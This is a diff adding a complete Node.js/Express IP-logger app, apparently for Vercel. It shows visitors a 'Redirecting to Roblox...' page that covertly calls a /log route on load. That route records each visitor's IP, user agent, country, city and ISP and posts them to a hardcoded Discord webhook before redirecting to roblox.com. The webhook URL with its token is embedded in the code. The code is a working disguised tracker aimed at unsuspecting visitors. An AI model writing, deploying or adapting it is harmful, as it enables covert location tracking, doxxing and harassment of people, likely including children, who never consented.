@@ -1,0 +1,281 @@
+const express = require('express');
+const axios = require('axios');
+const morgan = require('morgan');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+const cors = require('cors');
+const path = require('path');
+const fs = require('fs');
+const app = express();
+
+// Middleware for security and logging
+app.use(helmet()); // Security headers
+app.use(cors()); // Enable CORS
+app.use(express.json());
+app.use(morgan('combined')); // HTTP request logging
+
+// Rate limiting to prevent abuse
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 100, // Limit each IP to 100 requests per window
+  message: 'Too many requests, please try again later.',
+});
+app.use(limiter);
+
+// Environment variables (set these in Vercel dashboard)
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discordapp.com/api/webhooks/1374699792550068296/cSVi2jtMzUF2376eJbbxn8dqr5cq5qy7gdapMyUg44hGvL0x-YM8vfymlFl7GIb9FSmw';
+const REDIRECT_URL = 'https://www.roblox.com';
+
+// Serve static files (HTML, JS, CSS)
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Utility function to get client IP
+const getClientIp = (req) => {
+  const forwarded = req.headers['x-forwarded-for'];
+  return forwarded ? forwarded.split(',')[0] : req.ip;
+};
+
+// Utility function to fetch geolocation data
+const fetchGeoData = async (ip) => {
+  try {
+    const response = await axios.get(`http://ip-api.com/json/${ip}`);
+    return response.data;
+  } catch (error) {
+    console.error(`GeoData Error: ${error.message}`);
+    return null;
+  }
+};
+
+// Utility function to send data to Discord webhook
+const sendToDiscord = async (data) => {
+  try {
+    const embed = {
+      title: 'New Visitor IP Logged',
+      color: 0x00ff00,
+      fields: [
+        { name: 'IP Address', value: data.ip || 'Unknown', inline: true },
+        { name: 'Country', value: data.country || 'Unknown', inline: true },
+        { name: 'Region', value: data.region || 'Unknown', inline: true },
+        { name: 'City', value: data.city || 'Unknown', inline: true },
+        { name: 'ISP', value: data.isp || 'Unknown', inline: true },
+        { name: 'User Agent', value: data.userAgent || 'Unknown', inline: false },
+        { name: 'Timestamp', value: new Date().toISOString(), inline: false },
+      ],
+      footer: { text: 'IP Logger by Zack' },
+    };
+
+    await axios.post(DISCORD_WEBHOOK_URL, {
+      embeds: [embed],
+    });
+  } catch (error) {
+    console.error(`Discord Webhook Error: ${error.message}`);
+  }
+};
+
+// Route to handle IP logging
+app.get('/log', async (req, res) => {
+  try {
+    const ip = getClientIp(req);
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const geoData = await fetchGeoData(ip);
+
+    const logData = {
+      ip,
+      userAgent,
+      country: geoData?.country || 'Unknown',
+      region: geoData?.regionName || 'Unknown',
+      city: geoData?.city || 'Unknown',
+      isp: geoData?.isp || 'Unknown',
+    };
+
+    // Send to Discord
+    await sendToDiscord(logData);
+
+    // Log to file for debugging
+    fs.appendFileSync(
+      path.join(__dirname, 'logs.txt'),
+      `[${new Date().toISOString()}] IP: ${ip}, UA: ${userAgent}\n`
+    );
+
+    // Redirect to Roblox
+    res.redirect(REDIRECT_URL);
+  } catch (error) {
+    console.error(`Log Route Error: ${error.message}`);
+    res.redirect(REDIRECT_URL); // Redirect even if error occurs
+  }
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error(`Server Error: ${err.message}`);
+  res.status(500).send('Something went wrong, but you\'re being redirected!');
+  setTimeout(() => res.redirect(REDIRECT_URL), 1000);
+});
+
+// Frontend HTML
+const htmlContent = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #1a1a1a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .container {
+      text-align: center;
+      animation: fadeIn 1s ease-in;
+    }
+    @keyframes fadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    p {
+      font-size: 1.2em;
+      color: #ccc;
+    }
+    .error {
+      color: #e74c3c;
+      display: none;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="loader"></div>
+    <p>Redirecting to Roblox...</p>
+    <p class="error" id="errorMsg"></p>
+  </div>
+  <script>
+    // Client-side error logging
+    const logError = (message) => {
+      console.error(message);
+      const errorElement = document.getElementById('errorMsg');
+      if (errorElement) {
+        errorElement.textContent = message;
+        errorElement.style.display = 'block';
+      }
+    };
+
+    // Fetch IP and log to server
+    const logIp = async () => {
+      try {
+        const response = await fetch('/log', { method: 'GET' });
+        if (!response.ok) {
+          throw new Error('Failed to log IP');
+        }
+        // Redirect handled by server
+      } catch (error) {
+        logError('Client Error: ' + error.message);
+        // Fallback redirect
+        setTimeout(() => {
+          window.location.href = '${REDIRECT_URL}';
+        }, 1000);
+      }
+    };
+
+    // Run on page load
+    window.onload = () => {
+      try {
+        logIp();
+      } catch (error) {
+        logError('Onload Error: ' + error.message);
+      }
+    };
+
+    // Fallback redirect after 3 seconds
+    setTimeout(() => {
+      try {
+        window.location.href = '${REDIRECT_URL}';
+      } catch (error) {
+        logError('Redirect Error: ' + error.message);
+      }
+    }, 3000);
+  </script>
+</body>
+</html>
+`;
+
+// Write HTML to public/index.html
+fs.mkdirSync(path.join(__dirname, 'public'), { recursive: true });
+fs.writeFileSync(path.join(__dirname, 'public', 'index.html'), htmlContent);
+
+// Vercel configuration
+const vercelConfig = {
+  version: 2,
+  builds: [
+    {
+      src: 'index.js',
+      use: '@vercel/node',
+    },
+  ],
+  routes: [
+    {
+      src: '/(.*)',
+      dest: '/index.js',
+    },
+  ],
+};
+
+// Write Vercel config
+fs.writeFileSync(
+  path.join(__dirname, 'vercel.json'),
+  JSON.stringify(vercelConfig, null, 2)
+);
+
+// Package.json for dependencies
+const packageJson = {
+  name: 'ip-logger',
+  version: '1.0.0',
+  scripts: {
+    start: 'node index.js',
+  },
+  dependencies: {
+    express: '^4.18.2',
+    axios: '^1.6.7',
+    morgan: '^1.10.0',
+    helmet: '^7.1.0',
+    'express-rate-limit': '^7.1.5',
+    cors: '^2.8.5',
+  },
+};
+
+// Write package.json
+fs.writeFileSync(
+  path.join(__dirname, 'package.json'),
+  JSON.stringify(packageJson, null, 2)
+);
+
+// Start server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
+
+// Export for Vercel
+module.exports = app;
